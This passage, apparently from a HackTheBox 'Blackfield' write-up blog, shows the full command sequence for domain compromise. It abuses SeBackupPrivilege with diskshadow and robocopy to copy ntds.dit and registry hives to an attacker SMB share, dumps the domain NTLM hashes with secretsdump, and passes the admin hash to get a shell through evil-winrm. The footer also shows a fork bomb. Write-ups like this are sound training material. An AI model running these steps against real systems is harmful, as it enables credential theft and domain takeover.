</pre></table></code></div></div><p>Opening a smb share in kali and mounting it on windows:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbserver.py <span class="nt">-smb2support</span> share <span class="nb">.</span> <span class="nt">-username</span> caretaker <span class="nt">-password</span> caretaker
<span class="nt">---</span>
C:&gt; net use Z: <span class="se">\\</span>10.10.14.5<span class="se">\s</span>hare /u:caretaker caretaker
</pre></table></code></div></div><p>If <code class="language-plaintext highlighter-rouge">net use</code> command doesn’t work, try using another drive letter or share name. This will allow us to backup and access any files and folders on the system. The <code class="language-plaintext highlighter-rouge">NTDS.dit</code> file is the database for Active Directory that is present on all domain controllers. It stores hashes for all domain users as well information about other objects in the domain. These hashes can be extracted from the file by using the Impacket tool <code class="language-plaintext highlighter-rouge">secretsdump.py</code>. The script also requires the <code class="language-plaintext highlighter-rouge">SAM and SYSTEM registry</code> hives in order to decrypt the file. These hives can be exported using the <code class="language-plaintext highlighter-rouge">reg save</code> command.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\System</span><span class="w"> </span><span class="nx">System.hive</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\sam</span><span class="w"> </span><span class="nx">Sam.hive</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\security</span><span class="w"> </span><span class="nx">Security.hive</span><span class="w">
</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">ntds.dit</code> file is present in the <code class="language-plaintext highlighter-rouge">C:\Windows\ntds</code> folder. Unfortunately, the ntds.dit file is locked for use by the system and can’t be copied directly. Files and folders can be backed up using the /B switch of <code class="language-plaintext highlighter-rouge">robocopy</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>C:<span class="se">\&gt;</span> robocopy /B C:<span class="se">\W</span>indows<span class="se">\n</span>tds<span class="se">\ </span>.<span class="se">\n</span>tds   

The process cannot access the file because it is being used by another process.
</pre></table></code></div></div><p>Windows provides a feature known as Volume Shadow Copy to address this kind of problem. A shadow copy is a read-only snapshot of the disk that permits files to be accessed even if they’re in use. Usually, creating a shadow copy requires administrative privileges, and many utilities do perform this check. <strong>However the <code class="language-plaintext highlighter-rouge">diskshadow</code> utility will allow us to perform this action with just the SeBackup and SeRestore privileges.</strong> The following script can create a shadow copy of the C: , exposed as X: .</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">set</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="nx">persistent</span><span class="w"> </span><span class="nx">nowriters</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">metadata</span><span class="w"> </span><span class="nx">C:\Windows\Temp\meta.cab</span><span class="w">
</span><span class="n">add</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">c:</span><span class="w"> </span><span class="nx">alias</span><span class="w"> </span><span class="nx">caretaker</span><span class="w">
</span><span class="n">create</span><span class="w">
</span><span class="nx">expose</span><span class="w"> </span><span class="o">%</span><span class="nx">caretaker</span><span class="o">%</span><span class="w"> </span><span class="nx">x:</span><span class="w">
</span><span class="n">exec</span><span class="w"> </span><span class="s2">"C:\Windows\System32\cmd.exe"</span><span class="w"> </span><span class="nx">/C</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">x:\windows\ntds\ntds.dit</span><span class="w"> </span><span class="nx">c:\temp\ntds.dit</span><span class="w">
</span></pre></table></code></div></div><p>We need to convert the script to Windows format, as diskshadow expects DOS style CRLF line terminators. This can be done using the unix2dos command.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>unix2dos disk-shadow-script.txt
</pre></table></code></div></div><p>or you can just add a random char as CRLF at end of each line. Then you can load this script in <code class="language-plaintext highlighter-rouge">diskshadow</code>:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">diskshadow</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">disk-shadow-script.txt</span><span class="w">
</span></pre></table></code></div></div><p>Script shows error because last line tries to copy <code class="language-plaintext highlighter-rouge">ntds.dit</code> manually, which we know isnt possible. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blackfield/diskshadow-error.png" alt="diskshadow-error" /> We can now use <code class="language-plaintext highlighter-rouge">robocopy</code> to backup the X:\Windows\ntds\ntds.dit file.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">robocopy</span><span class="w"> </span><span class="nx">/B</span><span class="w"> </span><span class="nx">X:\Windows\ntds\</span><span class="w"> </span><span class="o">.</span><span class="nx">\ntds</span><span class="w">
</span></pre></table></code></div></div><p>OR you can use <a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a> instead of robocopy after you make <code class="language-plaintext highlighter-rouge">x:</code> share with diskshadow, robocopy copies the whole folder, with SeBackupPrivilegeCmdLets you can copy individual files.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SeBackupPrivilegeUtils.dll</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SeBackupPrivilegeCmdLets.dll</span><span class="w">

</span><span class="n">Copy-FileSeBackupPrivilege</span><span class="w"> </span><span class="nx">x:\windows\NTDS\ntds.dit</span><span class="w"> </span><span class="nx">Z:\ntds.dit</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\System</span><span class="w"> </span><span class="nx">System.hive</span><span class="w">
</span></pre></table></code></div></div><p>Then you can easily use <code class="language-plaintext highlighter-rouge">secretsdump.py</code> from impacket to dump those stored hashes:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span>secretsdump.py <span class="nt">-system</span> System.hive <span class="nt">-ntds</span> ntds.dit LOCAL
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>pekList, be patient
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PEK <span class="c"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:f4a13e41e3ae7a47a76323a4c6ef8e33:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local<span class="se">\B</span>LACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local<span class="se">\B</span>LACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
</pre></table></code></div></div><p>Simply doing a PTH gives administrator’s shell:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.10.192 <span class="nt">-u</span> administrator <span class="nt">-H</span> 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
ce9c2c3f6b95a901604aea4254e94cba
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/windows-machines/'>Windows Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >kerberos</a> <a href="/tags/rpcclient/" class="post-tag no-text-decoration" >rpcclient</a> <a href="/tags/rpc-password-reset/" class="post-tag no-text-decoration" >rpc-password-reset</a> <a href="/tags/bloodhound/" class="post-tag no-text-decoration" >bloodhound</a> <a href="/tags/sebackupprivilege/" class="post-tag no-text-decoration" >sebackupprivilege</a> <a href="/tags/diskshadow/" class="post-tag no-text-decoration" >diskshadow</a> <a href="/tags/robocopy/" class="post-tag no-text-decoration" >robocopy</a> <a href="/tags/diskshadow/" class="post-tag no-text-decoration" >diskshadow</a> <a href="/tags/smbserver/" class="post-tag no-text-decoration" >smbserver</a> <a href="/tags/secretsdump/" class="post-tag no-text-decoration" >secretsdump</a> <a href="/tags/john/" class="post-tag no-text-decoration" >john</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Blackfield - TheCaretaker&url=https://0xcaretaker.github.io/posts/Blackfield/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Blackfield - TheCaretaker&u=https://0xcaretaker.github.io/posts/Blackfield/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Blackfield - TheCaretaker&url=https://0xcaretaker.github.io/posts/Blackfield/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Nullcon_Winja_CTF_2022_Writeups_-_Active_Directory/">Nullcon Winja CTF 2022 Writeups - Active Directory</a></li><li><a href="/posts/Automation_on_the_Fly/">Automation on the Fly</a></li><li><a href="/posts/Vault/">Vault</a></li><li><a href="/posts/Knife/">Knife</a></li><li><a href="/posts/Ypuffy/">Ypuffy</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sql-injection/">sql injection</a> <a class="post-tag" href="/tags/return-to-libc/">return to libc</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a> <a class="post-tag" href="/tags/pivoting/">pivoting</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Nullcon_Winja_CTF_2022_Writeups_-_Active_Directory/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 12 <i class="unloaded">2022-09-12T18:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Nullcon Winja CTF 2022 Writeups - Active Directory</h3><div class="text-muted small"><p> Challenge-1 Blemflarck The Galactic Federation is taking control over the universe using a group of superheroes. The world’s redemption is in your hands. Enter the intergalactic portal and sabotag...</p></div></div></a></div><div class="card"> <a href="/posts/Atom/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jul 11, 2021 <i class="unloaded">2021-07-11T14:10:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Atom</h3><div class="text-muted small"><p> Enumeration Masscan + Nmap 1 2 3 4 5 6 7 8 9 10 11 $ masscan -p1-65535,U:1-65535 10.10.10.237 --rate=10000 -e tun0 | tee masscan.out Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2021-07-02 21...</p></div></div></a></div><div class="card"> <a href="/posts/Love/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 17, 2021 <i class="unloaded">2021-08-17T01:25:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Love</h3><div class="text-muted small"><p> Love is an easy box, Awesome for beginners. Starts with a SSRF to access a forbidden page meant to be accessed locally which leaks credentials for a Voting system. That voting system allows anyone ...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Century/" class="btn btn-outline-primary"><p>Century</p></a> <a href="/posts/Atom/" class="btn btn-outline-primary"><p>Atom</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="thecaretaker" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> <br> <br> © 2022 <a href="https://twitter.com/0xCaretaker">Deepak Dhasmana</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <br> <script src="https://www.hackthebox.eu/badge/371479"></script></p></div><div class="footer-right"><p class="mb-0"><h4>:(){ :|: &amp; }; :</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sql-injection/">sql injection</a> <a class="post-tag" href="/tags/return-to-libc/">return to libc</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a> <a class="post-tag" href="/tags/pivoting/">pivoting</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xcaretaker.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
